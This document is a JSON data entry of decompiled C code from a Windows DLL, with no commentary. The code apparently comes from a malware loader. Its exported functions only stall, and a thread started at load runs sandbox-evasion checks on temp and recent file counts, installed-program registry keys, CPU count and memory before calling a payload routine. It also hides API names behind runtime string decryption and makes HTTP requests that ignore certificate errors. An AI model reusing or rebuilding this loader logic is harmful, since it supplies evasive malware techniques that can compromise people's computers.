{
  "c_code": [
    "#include \"c3e06749-d3a1-4d56-9df1-bd5feba07438.h\"",
    "",
    "__int64 __fastcall sub_62741010(__int64 a1, int a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "  PVOID StackBase; // rsi",
    "  signed __int64 v7; // rax",
    "  int v8; // edi",
    "",
    "  if ( a2 )",
    "  {",
    "    if ( a2 == 1 )",
    "    {",
    "      StackBase = NtCurrentTeb()->NtTib.StackBase;",
    "      while ( 1 )",
    "      {",
    "        v7 = _InterlockedCompareExchange64(qword_62751B48, (signed __int64)StackBase, 0);",
    "        if ( !v7 )",
    "        {",
    "          v8 = 0;",
    "          goto LABEL_15;",
    "        }",
    "        if ( StackBase == (PVOID)v7 )",
    "          break;",
    "        Sleep(0x3E8u);",
    "      }",
    "      v8 = 1;",
    "LABEL_15:",
    "      if ( unk_62751B40 == 1 )",
    "      {",
    "        amsg_exit(31);",
    "      }",
    "      else if ( !unk_62751B40 )",
    "      {",
    "        unk_62751B40 = 1;",
    "        initterm(&qword_62755010, qword_62755020);",
    "      }",
    "      if ( unk_62751B40 == 1 )",
    "      {",
    "        initterm(&qword_62755000, &qword_62755008);",
    "        unk_62751B40 = 2;",
    "      }",
    "      if ( !v8 )",
    "        _InterlockedExchange64(qword_62751B48, 0);",
    "      if ( TlsCallback_0 )",
    "        TlsCallback_0(a1, 2, a3);",
    "      ++dword_62751018;",
    "      return 1;",
    "    }",
    "    else",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    result = 0;",
    "    if ( dword_62751018 > 0 )",
    "    {",
    "      --dword_62751018;",
    "      while ( _InterlockedCompareExchange64(qword_62751B48, 1, 0) )",
    "        Sleep(0x3E8u);",
    "      if ( unk_62751B40 == 2 )",
    "      {",
    "        sub_627499E0(&unk_62751000);",
    "        unk_62751B40 = 0;",
    "        _InterlockedExchange64(qword_62751B48, 0);",
    "        return 1;",
    "      }",
    "      else",
    "      {",
    "        amsg_exit(31);",
    "        return 1;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741200(void *a1, unsigned int a2, __int64 a3)",
    "{",
    "  unsigned int v6; // r14d",
    "  __int64 result; // rax",
    "",
    "  unk_6274A674 = a2;",
    "  if ( a2 )",
    "  {",
    "    sub_62748A20();",
    "    if ( a2 - 1 <= 1 )",
    "    {",
    "      if ( !(unsigned int)sub_62741010((__int64)a1, a2, a3) )",
    "        goto LABEL_5;",
    "      v6 = sub_62749810(a1, a2, a3);",
    "      if ( v6 )",
    "      {",
    "        if ( a2 != 1 )",
    "        {",
    "          v6 = sub_62741420(a1);",
    "          goto LABEL_6;",
    "        }",
    "        sub_627484D0();",
    "        v6 = sub_62741420(a1);",
    "        if ( v6 )",
    "          goto LABEL_6;",
    "        sub_62741420(a1);",
    "        sub_62749810(a1, 0, a3);",
    "      }",
    "      else if ( a2 != 1 )",
    "      {",
    "        goto LABEL_5;",
    "      }",
    "      sub_62741010((__int64)a1, 0, a3);",
    "      goto LABEL_6;",
    "    }",
    "    v6 = sub_62741420(a1);",
    "    if ( a2 != 3 )",
    "      goto LABEL_6;",
    "  }",
    "  else",
    "  {",
    "    if ( !dword_62751018 )",
    "    {",
    "LABEL_5:",
    "      v6 = 0;",
    "      goto LABEL_6;",
    "    }",
    "    sub_62748A20();",
    "    sub_62741420(a1);",
    "  }",
    "  v6 = sub_62749810(a1, a2, a3);",
    "  if ( !(unsigned int)sub_62741010((__int64)a1, a2, a3) )",
    "    goto LABEL_5;",
    "LABEL_6:",
    "  result = v6;",
    "  unk_6274A674 = -1;",
    "  return result;",
    "}",
    "",
    "",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)",
    "{",
    "  unk_62751810 = 0;",
    "  if ( fdwReason != 1 )",
    "    return sub_62741200(hinstDLL, fdwReason, (__int64)lpReserved);",
    "  sub_627484F0();",
    "  sub_62748ED0();",
    "  return sub_62741200(hinstDLL, 1u, (__int64)lpReserved);",
    "}",
    "",
    "",
    "__int64 __fastcall StartAddress(HMODULE lpThreadParameter)",
    "{",
    "  sub_62741DE0(lpThreadParameter);",
    "  dword_62751020 = 1;",
    "  return 0;",
    "}",
    "",
    "",
    "void sub_627413F0()",
    "{",
    "  while ( !dword_62751020 )",
    "    Sleep(0x3E8u);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741420(LPVOID lpParameter, int a2)",
    "{",
    "  HANDLE Thread; // rax",
    "  DWORD ThreadId[3]; // [rsp+3Ch] [rbp-Ch] BYREF",
    "",
    "  if ( a2 != 1 )",
    "    return 1;",
    "  Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, lpParameter, 0, ThreadId);",
    "  if ( !Thread )",
    "    return 1;",
    "  CloseHandle(Thread);",
    "  return 1;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllRegisterServer()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 DllRegisterServerEx()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)",
    "{",
    "  sub_627413F0();",
    "  return -2147221231;",
    "}",
    "",
    "",
    "HRESULT __stdcall DllUnregisterServer()",
    "{",
    "  sub_627413F0();",
    "  return 0;",
    "}",
    "",
    "",
    "void Start()",
    "{",
    "  sub_627413F0();",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62741530(_BYTE *a1, _BYTE *a2, int a3)",
    "{",
    "  _BYTE *v3; // r9",
    "  _BYTE *v4; // r10",
    "  int v5; // ebx",
    "  _BYTE *v6; // r9",
    "  _BYTE *v7; // r11",
    "  _BYTE *v8; // rdx",
    "",
    "  if ( a3 - 2 <= 0 )",
    "  {",
    "    v4 = a1;",
    "    v5 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = a2;",
    "    v4 = a1;",
    "    v5 = 0;",
    "    do",
    "    {",
    "      *v4 = aAbcdefghijklmn[*v3 >> 2];",
    "      v4[1] = aAbcdefghijklmn[((char)v3[1] >> 4) & 0xF | (16 * *v3) & 0x30];",
    "      v4[2] = aAbcdefghijklmn[((char)v3[2] >> 6) & 3 | (4 * v3[1]) & 0x3C];",
    "      v4 += 4;",
    "      *(v4 - 1) = aAbcdefghijklmn[v3[2] & 0x3F];",
    "      v5 += 3;",
    "      v3 += 3;",
    "    }",
    "    while ( v5 < a3 - 2 );",
    "  }",
    "  if ( a3 > v5 )",
    "  {",
    "    v6 = &a2[v5];",
    "    *v4 = aAbcdefghijklmn[*v6 >> 2];",
    "    if ( a3 - 1 == v5 )",
    "    {",
    "      v4[1] = aAbcdefghijklmn[(16 * *v6) & 0x30];",
    "      v8 = v4 + 3;",
    "      v4[2] = 61;",
    "    }",
    "    else",
    "    {",
    "      v7 = &a2[v5 + 1];",
    "      v4[1] = aAbcdefghijklmn[((char)*v7 >> 4) & 0xF | (16 * *v6) & 0x30];",
    "      v8 = v4 + 3;",
    "      v4[2] = aAbcdefghijklmn[(4 * *v7) & 0x3C];",
    "    }",
    "    v4 = v8 + 1;",
    "    *v8 = 61;",
    "  }",
    "  *v4 = 0;",
    "  return (_BYTE *)(v4 + 1 - a1);",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62741690(_BYTE *a1, _BYTE *a2, int a3)",
    "{",
    "  _BYTE *v3; // r9",
    "  _BYTE *v4; // r10",
    "  int v5; // ebx",
    "  _BYTE *v6; // r9",
    "  _BYTE *v7; // r11",
    "  _BYTE *v9; // r10",
    "",
    "  if ( a3 - 2 <= 0 )",
    "  {",
    "    v4 = a1;",
    "    v5 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = a2;",
    "    v4 = a1;",
    "    v5 = 0;",
    "    do",
    "    {",
    "      *v4 = aAbcdefghijklmn_0[*v3 >> 2];",
    "      v4[1] = aAbcdefghijklmn_0[((char)v3[1] >> 4) & 0xF | (16 * *v3) & 0x30];",
    "      v4[2] = aAbcdefghijklmn_0[((char)v3[2] >> 6) & 3 | (4 * v3[1]) & 0x3C];",
    "      v4 += 4;",
    "      *(v4 - 1) = aAbcdefghijklmn_0[v3[2] & 0x3F];",
    "      v5 += 3;",
    "      v3 += 3;",
    "    }",
    "    while ( v5 < a3 - 2 );",
    "  }",
    "  if ( a3 <= v5 )",
    "    goto LABEL_7;",
    "  v6 = &a2[v5];",
    "  *v4 = aAbcdefghijklmn_0[*v6 >> 2];",
    "  if ( a3 - 1 != v5 )",
    "  {",
    "    v7 = &a2[v5 + 1];",
    "    v4[1] = aAbcdefghijklmn_0[((char)*v7 >> 4) & 0xF | (16 * *v6) & 0x30];",
    "    v4[2] = aAbcdefghijklmn_0[(4 * *v7) & 0x3C];",
    "    v4 += 3;",
    "LABEL_7:",
    "    *v4 = 0;",
    "    return (_BYTE *)(v4 + 1 - a1);",
    "  }",
    "  v4[1] = aAbcdefghijklmn_0[(16 * *v6) & 0x30];",
    "  v9 = v4 + 2;",
    "  *v9 = 0;",
    "  return (_BYTE *)(v9 + 1 - a1);",
    "}",
    "",
    "",
    "int sub_627417F0(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741810(__int64 a1)",
    "{",
    "  const wchar_t *v2; // rbx",
    "  __int64 v3; // rsi",
    "  unsigned int v4; // ebx",
    "  const wchar_t *v5; // rbp",
    "  const wchar_t *v6; // r12",
    "  const WCHAR *v8; // rbx",
    "  const CHAR *v9; // rbx",
    "  const CHAR *v10; // rbx",
    "  const CHAR *v11; // rbx",
    "  wchar_t v12[264]; // [rsp+20h] [rbp-498h] BYREF",
    "  _BYTE v13[44]; // [rsp+230h] [rbp-288h] BYREF",
    "  WCHAR String1[302]; // [rsp+25Ch] [rbp-25Ch] BYREF",
    "",
    "  if ( hModule )",
    "  {",
    "    if ( qword_62751048 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v8 = (const WCHAR *)sub_62746BA0(&unk_6274B0C0);",
    "    hModule = LoadLibraryW(v8);",
    "    sub_62746C30(v8);",
    "    if ( qword_62751048 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751040 )",
    "        goto LABEL_4;",
    "LABEL_16:",
    "      v10 = (const CHAR *)sub_62746B10(&unk_6274B0F8);",
    "      qword_62751040 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v10);",
    "      sub_62746C30(v10);",
    "      if ( qword_62751038 )",
    "        goto LABEL_5;",
    "      goto LABEL_17;",
    "    }",
    "  }",
    "  v9 = (const CHAR *)sub_62746B10(&unk_6274B0E1);",
    "  qword_62751048 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v9);",
    "  sub_62746C30(v9);",
    "  if ( !qword_62751040 )",
    "    goto LABEL_16;",
    "LABEL_4:",
    "  if ( qword_62751038 )",
    "    goto LABEL_5;",
    "LABEL_17:",
    "  v11 = (const CHAR *)sub_62746B10(&unk_6274B10E);",
    "  qword_62751038 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(hModule, v11);",
    "  sub_62746C30(v11);",
    "LABEL_5:",
    "  v2 = (const wchar_t *)sub_62746BA0(&unk_6274B120);",
    "  sub_627417F0(v12, 0x104u, v2, a1);",
    "  sub_62746C30(v2);",
    "  v3 = qword_62751048(v12, v13);",
    "  v4 = 0;",
    "  if ( v3 != -1 )",
    "  {",
    "    v5 = (const wchar_t *)sub_62746BA0(&unk_6274B137);",
    "    v6 = (const wchar_t *)sub_62746BA0(&unk_6274B142);",
    "    while ( 1 )",
    "    {",
    "      while ( (v13[0] & 0x10) == 0 )",
    "      {",
    "        ++v4;",
    "LABEL_8:",
    "        if ( !(unsigned int)qword_62751040(v3, v13) )",
    "          goto LABEL_12;",
    "      }",
    "      if ( !wcscmp(String1, v5) )",
    "        goto LABEL_8;",
    "      v4 -= (wcscmp(String1, v6) == 0) - 1;",
    "      if ( !(unsigned int)qword_62751040(v3, v13) )",
    "      {",
    "LABEL_12:",
    "        sub_62746C30(v6);",
    "        sub_62746C30(v5);",
    "        qword_62751038(v3);",
    "        return v4;",
    "      }",
    "    }",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 sub_62741A50()",
    "{",
    "  int v0; // edx",
    "  __int64 result; // rax",
    "  const CHAR *v2; // rbx",
    "  const WCHAR *v3; // rbx",
    "  _BYTE v4[536]; // [rsp+20h] [rbp-218h] BYREF",
    "",
    "  if ( !hModule )",
    "  {",
    "    v3 = (const WCHAR *)sub_62746BA0(&unk_6274B150);",
    "    hModule = LoadLibraryW(v3);",
    "    sub_62746C30(v3);",
    "  }",
    "  if ( !qword_62751030 )",
    "  {",
    "    v2 = (const CHAR *)sub_62746B10(&unk_6274B171);",
    "    qword_62751030 = (__int64 (__fastcall *)(_QWORD, _QWORD))GetProcAddress(hModule, v2);",
    "    sub_62746C30(v2);",
    "  }",
    "  v0 = qword_62751030(260, v4);",
    "  result = 0;",
    "  if ( v0 )",
    "    return sub_62741810((__int64)v4);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741B10()",
    "{",
    "  HRESULT v0; // edx",
    "  __int64 result; // rax",
    "  WCHAR pszPath[268]; // [rsp+30h] [rbp-218h] BYREF",
    "",
    "  v0 = SHGetFolderPathW(0, 26, 0, 0, pszPath);",
    "  result = 0;",
    "  if ( v0 >= 0 )",
    "    return sub_62741810((__int64)pszPath);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741B60()",
    "{",
    "  const WCHAR *v0; // rdi",
    "  unsigned int v1; // esi",
    "  const WCHAR *v3; // r13",
    "  DWORD i; // ebx",
    "  DWORD cchName; // [rsp+4Ch] [rbp-25Ch] BYREF",
    "  HKEY phkResult; // [rsp+50h] [rbp-258h] BYREF",
    "  HKEY hKey; // [rsp+58h] [rbp-250h] BYREF",
    "  WCHAR Name[292]; // [rsp+60h] [rbp-248h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B188);",
    "  v1 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, v0, 0, 0x108u, &hKey);",
    "  if ( v1 )",
    "  {",
    "    v1 = 0;",
    "  }",
    "  else",
    "  {",
    "    v3 = (const WCHAR *)sub_62746BA0(&unk_6274B1F8);",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      cchName = 260;",
    "      if ( RegEnumKeyExW(hKey, i, Name, &cchName, 0, 0, 0, 0) )",
    "        break;",
    "      if ( !RegOpenKeyExW(hKey, Name, 0, 0x101u, &phkResult) )",
    "      {",
    "        v1 += RegQueryValueExW(phkResult, v3, 0, 0, 0, 0) == 0;",
    "        RegCloseKey(phkResult);",
    "      }",
    "    }",
    "    sub_62746C30(v3);",
    "    RegCloseKey(hKey);",
    "  }",
    "  sub_62746C30(v0);",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 sub_62741CD0()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  HMODULE ModuleHandleW; // rsi",
    "  const CHAR *v2; // rbx",
    "  FARPROC ProcAddress; // rsi",
    "  __int64 result; // rax",
    "  int v5; // [rsp+20h] [rbp-58h] BYREF",
    "  unsigned __int64 v6; // [rsp+28h] [rbp-50h]",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B220);",
    "  ModuleHandleW = GetModuleHandleW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B241);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v2);",
    "  sub_62746C30(v2);",
    "  v5 = 64;",
    "  result = ((__int64 (__fastcall *)(int *))ProcAddress)(&v5);",
    "  if ( (_DWORD)result )",
    "    return v6 >> 20;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_62741D50()",
    "{",
    "  const WCHAR *v0; // rbx",
    "  HMODULE ModuleHandleW; // rsi",
    "  const CHAR *v2; // rbx",
    "  FARPROC ProcAddress; // rsi",
    "  struct _SYSTEM_INFO SystemInfo; // [rsp+20h] [rbp-48h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B260);",
    "  ModuleHandleW = GetModuleHandleW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B281);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, v2);",
    "  sub_62746C30(v2);",
    "  if ( ProcAddress )",
    "    ((void (__fastcall *)(struct _SYSTEM_INFO *))ProcAddress)(&SystemInfo);",
    "  else",
    "    GetSystemInfo(&SystemInfo);",
    "  return SystemInfo.dwNumberOfProcessors;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62741DE0(HMODULE hModule)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (int)sub_62741A50() > 14 || (int)sub_62741B10() > 4 || (result = sub_62741B60(), (int)result > 4) )",
    "  {",
    "    if ( (unsigned int)sub_62741D50() > 3 && (int)sub_62741CD0() > 3839 )",
    "    {",
    "      return sub_62745AC0(hModule);",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned int)sub_62741D50() > 7 )",
    "        return sub_62745AC0(hModule);",
    "      result = sub_62741CD0();",
    "      if ( (int)result > 5887 )",
    "        return sub_62745AC0(hModule);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char *__fastcall sub_62741F30(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        unsigned __int16 a3,",
    "        int a4,",
    "        __int64 a5,",
    "        WCHAR *String,",
    "        __int64 a7,",
    "        int a8,",
    "        _DWORD *a9,",
    "        int a10)",
    "{",
    "  __int64 v14; // rax",
    "  __int64 v15; // rdi",
    "  __int64 v16; // r13",
    "  char *v17; // rbx",
    "  __int64 v18; // rsi",
    "  __int64 v19; // rbp",
    "  const wchar_t *v20; // rsi",
    "  size_t v21; // rbx",
    "  size_t v22; // rax",
    "  wchar_t *v23; // rax",
    "  wchar_t *v24; // rbx",
    "  int v25; // esi",
    "  int v26; // r12d",
    "  const WCHAR *v28; // rdi",
    "  const CHAR *v29; // rdi",
    "  const CHAR *v30; // rdi",
    "  const CHAR *v31; // rdi",
    "  const CHAR *v32; // rdi",
    "  const CHAR *v33; // rdi",
    "  const CHAR *v34; // rdi",
    "  const CHAR *v35; // rdi",
    "  const CHAR *v36; // rdi",
    "  DWORD LastError; // eax",
    "  int v38; // [rsp+40h] [rbp-58h] BYREF",
    "  int v39; // [rsp+44h] [rbp-54h] BYREF",
    "  int v40; // [rsp+48h] [rbp-50h] BYREF",
    "  _DWORD v41[19]; // [rsp+4Ch] [rbp-4Ch] BYREF",
    "",
    "  if ( qword_627510A0 )",
    "  {",
    "    if ( qword_62751098 )",
    "      goto LABEL_3;",
    "  }",
    "  else",
    "  {",
    "    v28 = (const WCHAR *)sub_62746BA0(&unk_6274B2A0);",
    "    qword_627510A0 = LoadLibraryW(v28);",
    "    sub_62746C30(v28);",
    "    if ( qword_62751098 )",
    "    {",
    "LABEL_3:",
    "      if ( qword_62751090 )",
    "        goto LABEL_4;",
    "      goto LABEL_35;",
    "    }",
    "  }",
    "  v29 = (const CHAR *)sub_62746B10(&unk_6274B2BF);",
    "  qword_62751098 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD))GetProcAddress(qword_627510A0, v29);",
    "  sub_62746C30(v29);",
    "  if ( qword_62751090 )",
    "  {",
    "LABEL_4:",
    "    if ( qword_62751088 )",
    "      goto LABEL_5;",
    "    goto LABEL_36;",
    "  }",
    "LABEL_35:",
    "  v30 = (const CHAR *)sub_62746B10(&unk_6274B2D5);",
    "  qword_62751090 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v30);",
    "  sub_62746C30(v30);",
    "  if ( qword_62751088 )",
    "  {",
    "LABEL_5:",
    "    if ( qword_62751080 )",
    "      goto LABEL_6;",
    "    goto LABEL_37;",
    "  }",
    "LABEL_36:",
    "  v31 = (const CHAR *)sub_62746B10(&unk_6274B2F0);",
    "  qword_62751088 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v31);",
    "  sub_62746C30(v31);",
    "  if ( qword_62751080 )",
    "  {",
    "LABEL_6:",
    "    if ( qword_62751078 )",
    "      goto LABEL_7;",
    "    goto LABEL_38;",
    "  }",
    "LABEL_37:",
    "  v32 = (const CHAR *)sub_62746B10(&unk_6274B30D);",
    "  qword_62751080 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _QWORD))GetProcAddress(qword_627510A0, v32);",
    "  sub_62746C30(v32);",
    "  if ( qword_62751078 )",
    "  {",
    "LABEL_7:",
    "    if ( qword_62751070 )",
    "      goto LABEL_8;",
    "    goto LABEL_39;",
    "  }",
    "LABEL_38:",
    "  v33 = (const CHAR *)sub_62746B10(&unk_6274B326);",
    "  qword_62751078 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD))GetProcAddress(qword_627510A0, v33);",
    "  sub_62746C30(v33);",
    "  if ( qword_62751070 )",
    "  {",
    "LABEL_8:",
    "    if ( qword_62751068 )",
    "      goto LABEL_9;",
    "LABEL_40:",
    "    v35 = (const CHAR *)sub_62746B10(&unk_6274B358);",
    "    qword_62751068 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(qword_627510A0, v35);",
    "    sub_62746C30(v35);",
    "    if ( qword_62751060 )",
    "      goto LABEL_10;",
    "    goto LABEL_41;",
    "  }",
    "LABEL_39:",
    "  v34 = (const CHAR *)sub_62746B10(&unk_6274B33F);",
    "  qword_62751070 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD))GetProcAddress(qword_627510A0, v34);",
    "  sub_62746C30(v34);",
    "  if ( !qword_62751068 )",
    "    goto LABEL_40;",
    "LABEL_9:",
    "  if ( qword_62751060 )",
    "    goto LABEL_10;",
    "LABEL_41:",
    "  v36 = (const CHAR *)sub_62746B10(&unk_6274B371);",
    "  qword_62751060 = (__int64 (__fastcall *)(_QWORD))GetProcAddress(qword_627510A0, v36);",
    "  sub_62746C30(v36);",
    "LABEL_10:",
    "  v14 = qword_62751098(a1, 0, 0, 0, 0);",
    "  v15 = v14;",
    "  if ( !v14 )",
    "    return 0;",
    "  v41[0] = 60000;",
    "  qword_62751090(v14, 2, v41, 4);",
    "  qword_62751090(v15, 5, v41, 4);",
    "  qword_62751090(v15, 6, v41, 4);",
    "  v16 = qword_62751080(v15, a2, a3, 0, 0, 3, 0, 0);",
    "  v17 = (char *)v16;",
    "  if ( v16 )",
    "  {",
    "    if ( a4 == 2 )",
    "    {",
    "      v18 = sub_62746BA0(&unk_6274B39C);",
    "    }",
    "    else",
    "    {",
    "      v18 = sub_62746BA0(&unk_6274B38D);",
    "      a8 = 0;",
    "      a7 = 0;",
    "    }",
    "    v19 = qword_62751078(v16, v18, a5, 0, 0, 0, a10 == 0 ? -2142765056 : -2134376448, 0);",
    "    sub_62746C30(v18);",
    "    v17 = (char *)v19;",
    "    if ( v19 )",
    "    {",
    "      if ( String )",
    "      {",
    "        v20 = (const wchar_t *)sub_62746BA0(&unk_6274B3AD);",
    "        v21 = wcslen(v20);",
    "        v22 = wcslen(String);",
    "        v23 = (wchar_t *)sub_62745B80(2 * (v21 + v22 + 1));",
    "        v24 = v23;",
    "        if ( v23 )",
    "        {",
    "          wcscpy(v23, v20);",
    "          wcscat(v24, String);",
    "        }",
    "        sub_62746C30(v20);",
    "        String = v24;",
    "      }",
    "      SetLastError(0);",
    "      qword_62751070(v19, String, 0, a7, a8);",
    "      if ( a10 )",
    "      {",
    "        LastError = GetLastError();",
    "        if ( LastError == 12045 || LastError == 12057 )",
    "        {",
    "          v39 = 4;",
    "          qword_62751088(v19, 31, &v40, &v39);",
    "          v40 |= 0x3180u;",
    "          qword_62751090(v19, 31, &v40, 4);",
    "          qword_62751070(v19, 0, 0, a7, a8);",
    "        }",
    "      }",
    "      v17 = (char *)sub_62745B80(0x1000u);",
    "      v25 = 0;",
    "      v26 = 0;",
    "      if ( v17 )",
    "      {",
    "        while ( (unsigned int)qword_62751068(v19, &v17[v25], 4096, &v38) && v38 )",
    "        {",
    "          v26 += v38;",
    "          v17 = (char *)sub_62745BB0(v17, (unsigned int)(v25 + 0x2000));",
    "          v25 += 4096;",
    "        }",
    "        if ( v26 )",
    "        {",
    "          *a9 = v26;",
    "        }",
    "        else",
    "        {",
    "          sub_62745BE0(v17);",
    "          v17 = 0;",
    "        }",
    "      }",
    "      qword_62751060(v19);",
    "    }",
    "    qword_62751060(v16);",
    "  }",
    "  qword_62751060(v15);",
    "  return v17;",
    "}",
    "",
    "",
    "int sub_62742580(wchar_t *a1, size_t a2, const wchar_t *a3, ...)",
    "{",
    "  va_list Args; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  va_start(Args, a3);",
    "  return vsnwprintf(a1, a2, a3, Args);",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_627425A0(LPCWCH lpWideCharStr)",
    "{",
    "  int v2; // eax",
    "  int cbMultiByte; // ebx",
    "  CHAR *v4; // rsi",
    "  CHAR *lpMultiByteStr; // rax",
    "",
    "  v2 = WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "  cbMultiByte = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpMultiByteStr = (CHAR *)sub_62745B80(v2);",
    "    v4 = lpMultiByteStr;",
    "    if ( lpMultiByteStr )",
    "      WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, -1, lpMultiByteStr, cbMultiByte, 0, 0);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62742640(_PROCESS_INFORMATION *lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(0xFDE9u, 0, (LPCCH)lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(0xFDE9u, 0, (LPCCH)lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "CHAR *__fastcall sub_627426C0(LPCWCH lpWideCharStr)",
    "{",
    "  int v2; // eax",
    "  int cbMultiByte; // ebx",
    "  CHAR *v4; // rsi",
    "  CHAR *lpMultiByteStr; // rax",
    "",
    "  v2 = WideCharToMultiByte(1u, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "  cbMultiByte = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpMultiByteStr = (CHAR *)sub_62745B80(v2);",
    "    v4 = lpMultiByteStr;",
    "    if ( lpMultiByteStr )",
    "      WideCharToMultiByte(1u, 0, lpWideCharStr, -1, lpMultiByteStr, cbMultiByte, 0, 0);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "WCHAR *__fastcall sub_62742760(_PROCESS_INFORMATION *lpMultiByteStr)",
    "{",
    "  int v2; // eax",
    "  int cchWideChar; // ebx",
    "  WCHAR *v4; // rsi",
    "  WCHAR *lpWideCharStr; // rax",
    "",
    "  v2 = MultiByteToWideChar(1u, 0, (LPCCH)lpMultiByteStr, -1, 0, 0);",
    "  cchWideChar = v2;",
    "  v4 = 0;",
    "  if ( v2 )",
    "  {",
    "    lpWideCharStr = (WCHAR *)sub_62745B80(2LL * v2 + 2);",
    "    v4 = lpWideCharStr;",
    "    if ( lpWideCharStr )",
    "      MultiByteToWideChar(1u, 0, (LPCCH)lpMultiByteStr, -1, lpWideCharStr, cchWideChar);",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_62742820(__int64 a1)",
    "{",
    "  _BYTE *result; // rax",
    "  char v3; // cl",
    "  __int64 v4; // rdx",
    "  int i; // r8d",
    "  char v6; // cl",
    "  __int64 v7; // rdx",
    "",
    "  result = (_BYTE *)sub_62745B80(strlen((const char *)a1) + 1);",
    "  if ( result )",
    "  {",
    "    *result = 0;",
    "    v3 = *(_BYTE *)a1;",
    "    if ( *(_BYTE *)a1 != 34 )",
    "    {",
    "      v4 = 1;",
    "      for ( i = 0; v3; v3 = *(_BYTE *)(a1 + v4 - 1) )",
    "      {",
    "        result[v4 - 1] = v3;",
    "        i = v4++;",
    "      }",
    "      goto LABEL_5;",
    "    }",
    "    v6 = *(_BYTE *)(a1 + 1);",
    "    if ( !v6 || v6 == 34 )",
    "    {",
    "      i = 0;",
    "LABEL_5:",
    "      result[i] = 0;",
    "      return result;",
    "    }",
    "    v7 = 1;",
    "    while ( 1 )",
    "    {",
    "      result[v7 - 1] = v6;",
    "      i = v7;",
    "      v6 = *(_BYTE *)(a1 + v7++ + 1);",
    "      if ( !v6 )",
    "        break;",
    "      if ( v6 == 34 )",
    "        goto LABEL_5;",
    "    }",
    "    result[i] = 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
